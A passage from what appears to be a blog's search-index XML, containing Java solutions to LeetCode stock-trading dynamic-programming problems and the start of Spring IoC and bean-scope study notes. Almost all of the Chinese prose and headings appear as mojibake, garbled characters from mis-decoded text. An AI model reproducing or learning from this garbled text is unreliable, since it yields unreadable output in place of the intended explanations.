tmp-prices[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Math.max(sell2,sell1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å®é™…ä¸Šæˆ‘ä»¬è¿˜å¯ä»¥é¢ å€’sell1å’Œsell2çš„é¡ºåº,è€Œä¸éœ€è¦tmp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProfit</span><span class="params">(<span class="type">int</span>[] prices)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(prices==<span class="literal">null</span>||prices.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       <span class="type">int</span> buy1= -prices[<span class="number">0</span>],sell1=<span class="number">0</span>,buy2=Integer.MIN_VALUE,sell2=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; prices.length; i++) &#123;            </span><br><span class="line">           sell2 = Math.max(sell2, buy2+prices[i]);</span><br><span class="line">           buy2 =  Math.max(buy2, sell1-prices[i]);</span><br><span class="line">           </span><br><span class="line">           sell1 = Math.max(sell1, buy1+prices[i]);</span><br><span class="line">           buy1 = Math.max(buy1, -prices[i]);           </span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> Math.max(sell2,sell1);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="leetcode-188-best-time-to-buy-and-sell-stock-iv">Leetcode 188 Best Time to Buy and Sell Stock IV Ã—</span></h2><p>ç»™å®šä¸€ä¸ªæ•°ç»„pricesï¼Œprices[i]è¡¨ç¤ºè‚¡ç¥¨åœ¨ç¬¬iå¤©çš„ä»·æ ¼ï¼ˆä¹°å…¥orå–å‡ºï¼‰ï¼Œåœ¨å–å‡ºè‚¡ç¥¨ä¹‹å‰å¿…é¡»å…ˆä¹°è¿›ï¼Œä¸”æ‰‹ä¸­ä¸èƒ½åŒæ—¶ä¹°è¿›ä¸¤ä»½è‚¡ç¥¨ï¼Œç°åœ¨å…è®¸åš<strong>æœ€å¤š</strong>Kæ¬¡äº¤æ˜“ï¼Œæ±‚æœ€å¤§æ”¶ç›Šã€‚</p><p>è¾“å…¥ï¼š[2, 4, 1], k &#x3D; 2</p><p>è¾“å‡ºï¼š2</p><p>è¾“å…¥ï¼š[3,2,6,5,0,3], k &#x3D; 2</p><p>è¾“å‡ºï¼š7</p><p>åˆšåˆšä¸¤æ¬¡äº¤æ˜“æˆ‘ä»¬éœ€è¦buy1 buy2 sell1 sell2ï¼Œæ‰€ä»¥Kæ¬¡äº¤æ˜“éœ€è¦å¤šå°‘ä¸ªsell buyå‘¢ï¼ŸKä¸ªå—ï¼Ÿ</p><p>ä¸ä¸€å®šå¯¹ã€‚</p><p>å½“K&gt;&#x3D;ç»™å®šæ•°ç»„é•¿åº¦&#x2F;2 å³ï¼šprice.length&#x2F;2çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºä¹°å–æ— æ•°æ¬¡çš„ç»“æœï¼Œå› æ­¤ç›¸å¯¹äºç¬¬äºŒé¢˜ã€‚ä¸ºä»€ä¹ˆè¦æƒ³é‚£ä¹ˆéº»çƒ¦å‘¢ï¼Ÿå› ä¸ºç¬¬äºŒé¢˜æ˜¯O(n)çš„è§£æ³•ã€‚</p><p>åˆå§‹åŒ–buyå¯ä»¥éƒ½å¡«å……-prices[0]çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProfit</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span>[] prices)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (prices==<span class="literal">null</span>||prices.length==<span class="number">0</span>||k==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (prices.length/<span class="number">2</span>&lt;=k) <span class="keyword">return</span> maxProfit(prices);</span><br><span class="line">    <span class="type">int</span>[] buy = <span class="keyword">new</span> <span class="title class_">int</span>[k+<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span>[] sell= <span class="keyword">new</span> <span class="title class_">int</span>[k+<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">    Arrays.fill(buy, Integer.MIN_VALUE);</span><br><span class="line">    buy[<span class="number">1</span>] = -prices[<span class="number">0</span>];   </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;= k; j++) &#123;</span><br><span class="line">            buy[j] = Math.max(buy[j],sell[j-<span class="number">1</span>]-prices[i]);</span><br><span class="line">            sell[j] = Math.max(sell[j],buy[j]+prices[i]);            </span><br><span class="line">            res=Math.max(res,sell[j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProfit</span><span class="params">(<span class="type">int</span>[] prices)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(prices==<span class="literal">null</span>||prices.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">buy</span> <span class="operator">=</span> -prices[<span class="number">0</span>],sell=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> sell;</span><br><span class="line">        sell = Math.max(sell, buy+prices[i]);</span><br><span class="line">        buy = Math.max(buy, tmp-prices[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sell;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="leetcode-309-best-time-to-buy-and-sell-stock-with-cooldown">Leetcode 309 Best Time to Buy and Sell Stock with Cooldown âˆš</span></h2><p>ç»™å®šä¸€ä¸ªæ•°ç»„pricesï¼Œprices[i]è¡¨ç¤ºè‚¡ç¥¨åœ¨ç¬¬iå¤©çš„ä»·æ ¼ï¼ˆä¹°å…¥orå–å‡ºï¼‰ï¼Œåœ¨å–å‡ºè‚¡ç¥¨ä¹‹å‰å¿…é¡»å…ˆä¹°è¿›ï¼Œä¸”æ‰‹ä¸­ä¸èƒ½åŒæ—¶ä¹°è¿›ä¸¤ä»½è‚¡ç¥¨ï¼Œç°åœ¨å…è®¸åš<strong>æ— æ•°æ¬¡äº¤æ˜“ï¼Œä½†æ¯æ¬¡å–å‡ºä¹‹åå¿…é¡»è‡³å°‘ä¼‘æ¯ä¸€å¤©</strong>ï¼Œæ±‚æœ€å¤§æ”¶ç›Šã€‚</p><p>è¾“å…¥ï¼š[1,2,3,0,2]</p><p>è¾“å‡ºï¼š3</p><p>è‡ªå·±åšå§</p><p>å®šä¹‰sellè¡¨ç¤ºæˆªæ­¢åˆ°å½“å¤©ï¼Œå–ä¹‹åèƒ½å¾—åˆ°çš„æœ€å¤§æ”¶ç›Š</p><p>å®šä¹‰buyè¡¨ç¤ºæˆªæ­¢åˆ°å½“å¤©ï¼Œä¹°ä¹‹åèƒ½å¾—åˆ°çš„æœ€å¤§æ”¶ç›Š</p><p>å®šä¹‰restè¡¨ç¤ºæˆªæ­¢åˆ°å½“å¤©ï¼Œä¼‘æ¯ä¹‹åèƒ½å¾—åˆ°çš„æœ€å¤§æ”¶ç›Š</p><p>Restçš„åˆå§‹å€¼ï¼Ÿï¼Ÿ</p><p>æŒ‰é¡ºåºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProfit</span><span class="params">(<span class="type">int</span>[] prices)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (prices==<span class="literal">null</span>||prices.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">buy</span> <span class="operator">=</span> -prices[<span class="number">0</span>],sell=<span class="number">0</span>,rest=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> rest;</span><br><span class="line">            rest = Math.max(rest, sell);</span><br><span class="line">            sell = Math.max(sell,buy+prices[i]);</span><br><span class="line">            buy = Math.max(buy, tmp-prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sell;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="leetcode-714-best-time-to-buy-and-sell-stock-with-transcation-fee">Leetcode 714 Best Time to Buy and Sell Stock with Transcation Fee âˆš</span></h2><p>ç»™å®šä¸€ä¸ªæ•°ç»„pricesï¼Œprices[i]è¡¨ç¤ºè‚¡ç¥¨åœ¨ç¬¬iå¤©çš„ä»·æ ¼ï¼ˆä¹°å…¥orå–å‡ºï¼‰ï¼Œåœ¨å–å‡ºè‚¡ç¥¨ä¹‹å‰å¿…é¡»å…ˆä¹°è¿›ï¼Œä¸”æ‰‹ä¸­ä¸èƒ½åŒæ—¶ä¹°è¿›ä¸¤ä»½è‚¡ç¥¨ï¼Œç°åœ¨å…è®¸åš<strong>æ— æ•°æ¬¡äº¤æ˜“ï¼Œä½†æ¯æ¬¡å–å‡ºéœ€è¦æ”¯ä»˜ä¸€å®šçš„æ‰‹ç»­è´¹</strong>ï¼Œæ±‚æœ€å¤§æ”¶ç›Šã€‚</p><p>è¾“å…¥ï¼š[1, 3, 2, 8, 4, 9], fee &#x3D; 2</p><p>è¾“å‡ºï¼š8</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProfit</span><span class="params">(<span class="type">int</span>[] prices, <span class="type">int</span> fee)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (prices==<span class="literal">null</span>||prices.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> buy=-prices[<span class="number">0</span>],sell=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; prices.length; i++) &#123;  </span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> sell;</span><br><span class="line">            sell = Math.max(sell, buy+prices[i]-fee);</span><br><span class="line">            buy = Math.max(buy, tmp-prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sell;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŠ¨æ€è§„åˆ’ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring-concept</title>
      <link href="/2020/03/23/spring-concept/"/>
      <url>/2020/03/23/spring-concept/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>SpinrgåŸºç¡€çŸ¥è¯†ç‚¹ </p><span id="more"></span><!-- toc --><ul><li><a href="#iocinversion-of-control%E6%8E%A7%E5%88%B6%E5%8F%8D%E8%BD%AC">IOCï¼ˆInversion of Controlï¼‰ï¼šæ§åˆ¶åè½¬</a></li><li><a href="#%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5">ä¾èµ–æ³¨å…¥</a></li><li><a href="#%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%E7%9A%84%E6%96%B9%E5%BC%8F">ä¾èµ–æ³¨å…¥çš„æ–¹å¼</a></li><li><a href="#%E4%BE%9D%E8%B5%96%E5%80%92%E7%BD%AE%E5%8E%9F%E5%88%99ioc-di-ioc%E5%AE%B9%E5%99%A8%E7%9A%84%E5%85%B3%E7%B3%BB">ä¾èµ–å€’ç½®åŸåˆ™ï¼ŒIOCã€DIã€IOCå®¹å™¨çš„å…³ç³»</a></li><li><a href="#ioc%E5%AE%B9%E5%99%A8%E7%9A%84%E4%BC%98%E5%8A%BF">IOCå®¹å™¨çš„ä¼˜åŠ¿</a></li><li><a href="#spring-ioc%E6%94%AF%E6%8C%81%E7%9A%84%E5%8A%9F%E8%83%BD">Spring IOCæ”¯æŒçš„åŠŸèƒ½</a></li><li><a href="#spring-ioc%E5%AE%B9%E5%99%A8%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8E%A5%E5%8F%A3">Spring IOCå®¹å™¨çš„æ ¸å¿ƒæ¥å£</a></li><li><a href="#beanfactoryspring%E6%A1%86%E6%9E%B6%E6%9C%80%E6%A0%B8%E5%BF%83%E7%9A%84%E6%8E%A5%E5%8F%A3">BeanFactoryï¼šSpringæ¡†æ¶æœ€æ ¸å¿ƒçš„æ¥å£</a></li><li><a href="#beanfactory%E4%B8%8Eapplicationcontext%E7%9A%84%E6%AF%94%E8%BE%83">BeanFactoryä¸ApplicationContextçš„æ¯”è¾ƒ</a></li><li><a href="#%E4%B8%89%E4%B8%AA%E5%B8%B8%E7%94%A8%E7%9A%84applicationcontext%E5%AE%9E%E7%8E%B0%E6%98%AF">ä¸‰ä¸ªå¸¸ç”¨çš„ApplicationContextå®ç°æ˜¯:</a></li><li><a href="#getbean%E6%96%B9%E6%B3%95%E7%9A%84%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91">GetBeanæ–¹æ³•çš„ä»£ç é€»è¾‘</a></li><li><a href="#spring-bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F">Spring Beançš„ä½œç”¨åŸŸ</a></li><li><a href="#%E5%85%B3%E6%B3%A8%E7%82%B9%E5%88%86%E7%A6%BB%E4%B8%8D%E5%90%8C%E7%9A%84%E9%97%AE%E9%A2%98%E4%BA%A4%E7%BB%99%E4%B8%8D%E5%90%8C%E7%9A%84%E9%83%A8%E5%88%86%E5%8E%BB%E8%A7%A3%E5%86%B3">å…³æ³¨ç‚¹åˆ†ç¦»ï¼šä¸åŒçš„é—®é¢˜äº¤ç»™ä¸åŒçš„éƒ¨åˆ†å»è§£å†³</a></li><li><a href="#aop%E7%9A%84%E4%B8%89%E7%A7%8D%E7%BB%87%E5%85%A5%E6%96%B9%E5%BC%8F">AOPçš„ä¸‰ç§ç»‡å…¥æ–¹å¼</a></li><li><a href="#aop%E7%9A%84%E4%B8%BB%E8%A6%81%E5%90%8D%E8%AF%8D%E6%A6%82%E5%BF%B5">AOPçš„ä¸»è¦åè¯æ¦‚å¿µ</a></li><li><a href="#advice%E7%9A%84%E7%A7%8D%E7%B1%BB">Adviceçš„ç§ç±»</a></li><li><a href="#aop%E7%9A%84%E5%AE%9E%E7%8E%B0jdkproxy%E5%92%8Ccglib">AOPçš„å®ç°ï¼šjdkProxyå’ŒCglib</a></li><li><a href="#spring%E9%87%8C%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%AE%9E%E7%8E%B0">Springé‡Œä»£ç†æ¨¡å¼çš„å®ç°</a></li><li><a href="#%E4%BA%8B%E5%8A%A1%E4%BC%A0%E6%92%AD">äº‹åŠ¡ä¼ æ’­</a></li><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AFaop">ä»€ä¹ˆæ˜¯AOP</a></li></ul><!-- tocstop --><h2><span id="iocinversion-of-controlæ§åˆ¶åè½¬">IOCï¼ˆInversion of Controlï¼‰ï¼šæ§åˆ¶åè½¬</span></h2><p>æœ‰äº†IoCå®¹å™¨åï¼ŒæŠŠåˆ›å»ºå’ŒæŸ¥æ‰¾ä¾èµ–å¯¹è±¡çš„æ§åˆ¶æƒäº¤ç»™äº†å®¹å™¨ï¼Œç”±å®¹å™¨è¿›è¡Œæ³¨å…¥ç»„åˆå¯¹è±¡ï¼Œæ‰€ä»¥å¯¹è±¡ä¸å¯¹è±¡ä¹‹é—´æ˜¯æ¾æ•£è€¦åˆï¼Œè¿™æ ·ä¹Ÿæ–¹ä¾¿æµ‹è¯•ï¼Œåˆ©äºåŠŸèƒ½å¤ç”¨ï¼Œæ›´ä½¿å¾—ç¨‹åºçš„æ•´ä¸ªä½“ç³»ç»“æ„å˜å¾—éå¸¸çµæ´»ã€‚</p><p>Ã˜ Spring Coreæœ€æ ¸å¿ƒçš„éƒ¨åˆ†</p><p>Ã˜ éœ€è¦äº†è§£ä¾èµ–æ³¨å…¥ï¼ˆDependency Injectionï¼‰</p><p><img src="/2020/03/23/spring-concept/image-20200406162508205.png"></p><p><img src="/2020/03/23/spring-concept/image-20200406162518521.png"></p><p>å¦‚æœæƒ³æŠŠtireçš„sizeåŠ¨æ€åŒ–æ”¹å˜å°±ä¼šç‰µä¸€å‘è€ŒåŠ¨å…¨èº«ï¼Œä¸Šå±‚çš„ä»£ç ä¹Ÿå¾—ä¿®æ”¹</p><p><img src="/2020/03/23/spring-concept/image-20200406162547753.png"></p><h2><span id="ä¾èµ–æ³¨å…¥">ä¾èµ–æ³¨å…¥</span></h2><p>å«ä¹‰ï¼šæŠŠä½å±‚ç±»ä½œä¸ºå‚æ•°ä¼ é€’ç»™ä¸Šå±‚ç±»ï¼Œå®ç°ä¸Šå±‚å¯¹ä¸‹å±‚çš„â€œæ§åˆ¶â€</p><p><img src="/2020/03/23/spring-concept/image-20200406162607619.png"></p><p>å°†tireä½œä¸ºæ„é€ å‡½æ•°çš„å‚æ•°ä¼ å…¥ï¼Œå¹¶èµ‹å€¼ç»™ä¸Šå±‚çš„æˆå‘˜å˜é‡ã€‚</p><p><img src="/2020/03/23/spring-concept/image-20200406162616526.png"></p><p>æƒ³è¦ä¿®æ”¹å°±å¯ä»¥åªä¿®æ”¹Tireçš„ä»£ç </p><p><img src="/2020/03/23/spring-concept/image-20200406162626533.png"></p><p><img src="/2020/03/23/spring-concept/image-20200406162635151.png"></p><p>DLæ˜¯æ›´ä¸»åŠ¨çš„æ–¹æ³•ï¼Œä¼šåœ¨éœ€è¦çš„æ—¶å€™é€šè¿‡è°ƒç”¨æ¡†æ¶çš„æ–¹æ³•æ¥è·å–å¯¹è±¡ï¼Œè·å–æ—¶éœ€è¦æä¾›ç›¸å…³çš„æ–‡ä»¶è·¯å¾„ï¼Œkeyç­‰ä¿¡æ¯ï¼Œæ¥ç¡®å®šè·å–å¯¹è±¡çš„çŠ¶æ€ã€‚</p><p>DLå·²ç»è¢«æŠ›å¼ƒï¼Œå› ä¸ºå®ƒéœ€è¦ç”¨æˆ·è‡ªå·±å»ä½¿ç”¨APIè¿›è¡ŒæŸ¥æ‰¾èµ„æºå’Œç»„è£…å¯¹è±¡ï¼Œå³æœ‰ä¾µå…¥æ€§ã€‚</p><h2><span id="ä¾èµ–æ³¨å…¥çš„æ–¹å¼">ä¾èµ–æ³¨å…¥çš„æ–¹å¼</span></h2><p>Ã˜ Setter</p><p>Ã˜ Interface</p><p>Ã˜ Constructor</p><p>Ã˜ Annotation</p><h2><span id="ä¾èµ–å€’ç½®åŸåˆ™ioc-di-iocå®¹å™¨çš„å…³ç³»">ä¾èµ–å€’ç½®åŸåˆ™ï¼ŒIOCã€DIã€IOCå®¹å™¨çš„å…³ç³»</span></h2><p><img src="/2020/03/23/spring-concept/image-20200406162723575.png"></p><h2><span id="iocå®¹å™¨çš„ä¼˜åŠ¿">IOCå®¹å™¨çš„ä¼˜åŠ¿</span></h2><p>Ã˜ é¿å…åœ¨å„å¤„ä½¿ç”¨newæ¥åˆ›å»ºç±»ï¼Œå¹¶ä¸”å¯ä»¥åšåˆ°ç»Ÿä¸€ç»´æŠ¤</p><p>Ã˜ åˆ›å»ºå®ä¾‹çš„æ—¶å€™ä¸éœ€è¦äº†è§£å…¶ä¸­çš„ç»†èŠ‚ </p><p>åœ¨åˆšåˆšçš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬æ˜¯ä»ä½å±‚å¾€ä¸Šå±‚å»newçš„ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£æ•´ä¸ªæµç¨‹ï¼ˆä»tireåˆ°luggageï¼‰çš„æ„é€ å‡½æ•°æ˜¯æ€ä¹ˆå®šä¹‰çš„æ‰èƒ½ä¸€æ­¥æ­¥ç»„è£…ã€‚ </p><p>è€Œä¾èµ–æ³¨å…¥åˆ™æ˜¯ä»æœ€ä¸Šå±‚å¼€å§‹æŸ¥æ‰¾ä¾èµ–å…³ç³»ï¼Œç„¶åå†å¾€ä¸Šä¸€æ­¥ä¸€æ­¥å»newã€‚æœ‰ç‚¹åƒDFS</p><p><img src="/2020/03/23/spring-concept/image-20200406163228391.png"></p><p>è“è‰²éƒ¨åˆ†æ˜¯éšè—çš„ç»†èŠ‚</p><p><img src="/2020/03/23/spring-concept/image-20200406163238732.png"></p><p><img src="/2020/03/23/spring-concept/image-20200406163245378.png"></p><h2><span id="spring-iocæ”¯æŒçš„åŠŸèƒ½">Spring IOCæ”¯æŒçš„åŠŸèƒ½</span></h2><p>Ã˜ ä¾èµ–æ³¨å…¥</p><p>Ã˜ ä¾èµ–æ£€æŸ¥</p><p>Ã˜ è‡ªåŠ¨è£…é…</p><p>Ã˜ æ”¯æŒé›†åˆ</p><p>Ã˜ æŒ‡å®šåˆå§‹åŒ–æ–¹æ³•å’Œé”€æ¯æ–¹æ³•</p><p>Ã˜ æ”¯æŒå›è°ƒæ–¹æ³•</p><h2><span id="spring-iocå®¹å™¨çš„æ ¸å¿ƒæ¥å£">Spring IOCå®¹å™¨çš„æ ¸å¿ƒæ¥å£</span></h2><p>Ã˜ BeanFactory</p><p>Ã˜ ApplicationContext</p><p><img src="/2020/03/23/spring-concept/image-20200406163330970.png"></p><p>Springå®¹å™¨å¯åŠ¨çš„æ—¶å€™ä¼šå°†æ³¨è§£æˆ–è€…XMLé‡Œé¢Beançš„å®šä¹‰è§£ææˆSpringå†…éƒ¨çš„BeanDefinition</p><p><img src="/2020/03/23/spring-concept/image-20200406163354759.png"></p><p><img src="/2020/03/23/spring-concept/image-20200406163358035.png"></p><p>æ˜¯ä¸ªConcurrentHashMap</p><h2><span id="beanfactoryspringæ¡†æ¶æœ€æ ¸å¿ƒçš„æ¥å£">BeanFactoryï¼šSpringæ¡†æ¶æœ€æ ¸å¿ƒçš„æ¥å£</span></h2><p>Ã˜ æä¾›IOCçš„é…ç½®æœºåˆ¶</p><p>Ã˜ åŒ…å«Beançš„å„ç§å®šä¹‰ï¼Œä¾¿äºå®ä¾‹åŒ–Bean</p><p>Ã˜ å»ºç«‹Beanä¹‹é—´çš„ä¾èµ–å…³ç³»</p><p>Ã˜ Beanç”Ÿå‘½å‘¨æœŸçš„æ§åˆ¶</p><p> <img src="/2020/03/23/spring-concept/image-20200406163455731.png"></p><p>ApplicationContextæ˜¯BeanFactoryçš„å­æ¥å£ä¹‹ä¸€</p><h2><span id="beanfactoryä¸applicationcontextçš„æ¯”è¾ƒ">BeanFactoryä¸ApplicationContextçš„æ¯”è¾ƒ</span></h2><p>Ã˜ BeanFactoryæ˜¯Springæ¡†æ¶çš„åŸºç¡€è®¾æ–½ï¼Œé¢å‘Spring</p><p>Ã˜ ApplicationContexté¢å‘ä½¿ç”¨Springæ¡†æ¶çš„å¼€å‘è€…</p><p>ApplicationContextçš„åŠŸèƒ½ï¼ˆå®ç°å¤šä¸ªæ¥å£ï¼‰</p><p>Ã˜ BeanFactoryï¼šèƒ½å¤Ÿç®¡ç†ã€è£…é…Bean</p><p>Ã˜ ResourcePatternResolverï¼šèƒ½å¤ŸåŠ è½½èµ„æºæ–‡ä»¶</p><p>Ã˜ MessageSourceï¼šèƒ½å¤Ÿå®ç°å›½é™…åŒ–ç­‰åŠŸèƒ½</p><p>Ã˜ ApplicationEventPublisherï¼šèƒ½å¤Ÿæ³¨å†Œç›‘å¬å™¨ï¼Œå®ç°ç›‘å¬æœºåˆ¶</p><p><img src="/2020/03/23/spring-concept/image-20200406163605604.png"></p><h2><span id="ä¸‰ä¸ªå¸¸ç”¨çš„applicationcontextå®ç°æ˜¯">ä¸‰ä¸ªå¸¸ç”¨çš„ApplicationContextå®ç°æ˜¯:</span></h2><ol><li>ClassPathXmlApplicationContext:å®ƒä»classpathè·¯å¾„ä¸‹çš„ä¸€ä¸ªXMLæ–‡ä»¶åŠ è½½contextçš„,å°†Contextä½œä¸ºclasspathä¸‹çš„èµ„æºã€‚åŠ è½½åº”ç”¨ç¨‹åºclasspathä¸‹çš„contextä½¿ç”¨çš„ä»£ç å¦‚ä¸‹ï¼š</li></ol><p>ApplicationContext context &#x3D; new ClassPathXmlApplicationContext(â€œbean.xmlâ€);</p><ol start="2"><li>FileSystemXmlApplicationContext:å®ƒä»æ–‡ä»¶ç³»ç»Ÿçš„ä¸€ä¸ªXMLæ–‡ä»¶åŠ è½½ä¸Šä¸‹æ–‡å®šä¹‰çš„ã€‚ä»æ–‡ä»¶ç³»ç»ŸåŠ è½½åº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡é€šè¿‡å¦‚ä¸‹ä»£ç å®ç°ã€‚</li></ol><p>ApplicationContext context &#x3D; new FileSystemXmlApplicationContext(â€œbean.xmlâ€);</p><ol start="3"><li>XmlWebApplicationContext:å®ƒä»ä¸€ä¸ªwebåº”ç”¨ç¨‹åºä¸­åŒ…å«çš„XMLæ–‡ä»¶åŠ è½½contextã€‚</li></ol><h2><span id="getbeanæ–¹æ³•çš„ä»£ç é€»è¾‘">GetBeanæ–¹æ³•çš„ä»£ç é€»è¾‘</span></h2><p>Ã˜ è½¬æ¢beanName</p><p>Ã˜ ä»ç¼“å­˜ä¸­åŠ è½½å®ä¾‹</p><p>Ã˜ å®ä¾‹åŒ–Bean</p><p>Ã˜ æ£€æµ‹patternBeanFactory</p><p>Ã˜ åˆå§‹åŒ–ä¾èµ–çš„Bean</p><p>Ã˜ åˆ›å»ºBean</p><h2><span id="spring-beançš„ä½œç”¨åŸŸ">Spring Beançš„ä½œç”¨åŸŸ</span></h2><p>Ã˜ Singletonï¼šSpringçš„é»˜è®¤ä½œç”¨åŸŸï¼Œå®¹å™¨é‡Œæ‹¥æœ‰å”¯ä¸€çš„Beanå®ä¾‹</p><p>Ã˜ Prototypeï¼šé’ˆå¯¹æ¯ä¸ªgetBeanè¯·æ±‚ï¼Œå®¹å™¨éƒ½ä¼šåˆ›å»ºä¸€ä¸ªBeanå®ä¾‹</p><p>Ã˜ Requestï¼šä¼šå¯¹æ¯ä¸ªHTTPè¯·æ±‚åˆ›å»ºä¸€ä¸ªBeanå®ä¾‹</p><p>Ã˜ Sessionï¼šä¼šå¯¹æ¯ä¸ªSessionåˆ›å»ºä¸€ä¸ªBeanå®ä¾‹</p><p>Ã˜ globalSessionï¼šä¼šä¸ºæ¯ä¸ªå…¨å±€Http Sessionåˆ›å»ºä¸€ä¸ªBeanå®ä¾‹ï¼Œè¯¥ä½œç”¨åŸŸä»…å¯¹Portletæœ‰æ•ˆ</p><p><img src="/2020/03/23/spring-concept/image-20200406163629950.png"></p><p><img src="/2020/03/23/spring-concept/image-20200406163635201.png"></p><p><img src="https://www.javazhiyin.com/wp-content/uploads/2019/05/java0-1558500658.jpg" alt="æ·±ç©¶Springä¸­Beançš„ç”Ÿå‘½å‘¨æœŸ"></p><h2><span 